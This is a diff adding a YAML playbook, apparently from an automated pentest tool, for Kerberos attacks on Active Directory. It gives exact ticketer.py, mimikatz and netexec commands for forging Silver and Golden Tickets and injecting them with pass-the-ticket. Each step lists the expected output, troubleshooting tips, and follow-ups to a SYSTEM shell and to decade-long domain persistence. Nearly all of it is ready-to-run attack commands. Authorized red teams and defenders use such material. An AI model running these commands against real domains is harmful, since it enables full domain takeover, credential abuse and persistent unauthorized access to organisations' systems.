@@ -1,0 +1,86 @@
+id: kerberos-tickets
+name: Kerberos Tickets (Golden, Silver & Pass-the-Ticket)
+category: ad
+description: Deep exploitation guide for forging Golden Tickets (krbtgt), Silver Tickets (CIFS, HTTP, MSSQL, HOST, WSMAN), Pass-the-Ticket injection, and lateral movement using forged TGS/TGT tickets.
+port_triggers:
+  - 88
+  - 445
+  - 389
+service_triggers:
+  - kerberos
+  - krb5
+  - ad
+tags:
+  - kerberos
+  - silver-ticket
+  - golden-ticket
+  - pass-the-ticket
+  - rubeus
+  - mimikatz
+  - ticketer
+steps:
+  - id: kerb-silver-ticket-impacket
+    title: Forge Silver Ticket for Target Service (Impacket ticketer.py)
+    phase: exploitation
+    purpose: Forge an offline Kerberos Service Ticket (TGS) using the target service account NTLM/AES hash to access specific service (CIFS, HTTP, MSSQL) without contacting DC.
+    command: ticketer.py -nthash {{HASH}} -domain-sid {{DOMAIN_SID|S-1-5-21-...}} -domain {{DOMAIN|corp.local}} -spn cifs/{{TARGET_HOST|dc.corp.local}} -user-id 500 Administrator
+    expected_output:
+      - '[*] Creating basic ticket'
+      - '[*] Saving ticket in Administrator.ccache'
+    common_mistakes:
+      - Domain SID must be obtained from user account `whoami /user` or `lookupsid.py`.
+      - SPN format must match target service hostname exactly (e.g. `cifs/target.corp.local` or `MSSQLSvc/db.corp.local:1433`).
+    if_success: Silver Ticket `Administrator.ccache` generated! Set `KRB5CCNAME` and use ticket.
+    if_failure: Invalid service hash or mismatched domain SID. Validate with `lookupsid.py`.
+    references:
+      - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket
+      - https://github.com/fortra/impacket
+
+  - id: kerb-silver-ticket-mimikatz
+    title: Forge Silver Ticket & Inject via Mimikatz (Windows)
+    phase: exploitation
+    purpose: Generate a Silver Ticket in memory on a Windows compromised host and immediately inject it into the current logon session (Pass-the-Ticket).
+    command: mimikatz.exe "kerberos::golden /domain:{{DOMAIN|corp.local}} /sid:{{DOMAIN_SID|S-1-5-21-...}} /target:{{TARGET_HOST|dc.corp.local}} /service:cifs /rc4:{{HASH}} /user:Administrator /ptt" exit
+    expected_output:
+      - 'User      : Administrator'
+      - 'Domain    : corp.local'
+      - 'Service   : cifs'
+      - 'Target    : dc.corp.local'
+      - 'Gold Ticket successfully submitted for current session'
+    common_mistakes:
+      - RC4 requires NTLM hash of the computer account (e.g. `DC01$`) or service account, NOT the administrator account.
+    if_success: Ticket injected! Access target service immediately with `dir \\\\dc.corp.local\\c$`.
+    if_failure: Verify SPN service name matches target (cifs, http, mssql, host, wsman).
+    references:
+      - https://wadcoms.github.io/
+
+  - id: kerb-golden-ticket-impacket
+    title: Forge Golden Ticket with krbtgt Hash (Full Domain Compromise)
+    phase: post-exploitation
+    purpose: Forge an offline Kerberos Ticket Granting Ticket (TGT) using the domain `krbtgt` NTLM or AES-256 key to achieve total domain persistence and admin access to any service.
+    command: ticketer.py -nthash {{KRBTGT_HASH}} -domain-sid {{DOMAIN_SID|S-1-5-21-...}} -domain {{DOMAIN|corp.local}} -extra-sid {{ENTERPRISE_ADMIN_SID}} Administrator
+    expected_output:
+      - '[*] Creating basic ticket'
+      - '[*] Customizing ticket for Administrator'
+      - '[*] Saving ticket in Administrator.ccache'
+    common_mistakes:
+      - krbtgt hash must be acquired via DCSync (`secretsdump.py`).
+    if_success: Golden Ticket generated! Authenticate against any domain service for up to 10 years.
+    if_failure: Ensure correct domain SID format and krbtgt NTLM hash.
+    references:
+      - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket
+
+  - id: kerb-pass-the-ticket-linux
+    title: Pass-the-Ticket (PTT) Execution on Linux
+    phase: exploitation
+    purpose: Export the forged or extracted `.ccache` ticket into the Linux environment variable `KRB5CCNAME` and execute remote administrative commands.
+    command: export KRB5CCNAME=Administrator.ccache && netexec smb {{TARGET_HOST|dc.corp.local}} -k --use-kcache
+    expected_output:
+      - '[+] corp.local\\Administrator (Pwn3d!)'
+    common_mistakes:
+      - Target must be referenced by FQDN (e.g. `dc.corp.local`), NOT by raw IP, when using Kerberos authentication.
+      - Ensure system time is synchronized with DC within 5 minutes (`sudo rdate -n <DC_IP>` or `ntpdate`).
+    if_success: Authenticated via Kerberos ticket! Run `psexec.py -k -no-pass` or `smbexec.py -k -no-pass` for interactive SYSTEM shell.
+    if_failure: Time skew error or FQDN not in `/etc/hosts`. Add `<DC_IP> <DOMAIN> <DC_HOSTNAME>.<DOMAIN>` to `/etc/hosts`.
+    references:
+      - https://wadcoms.github.io/
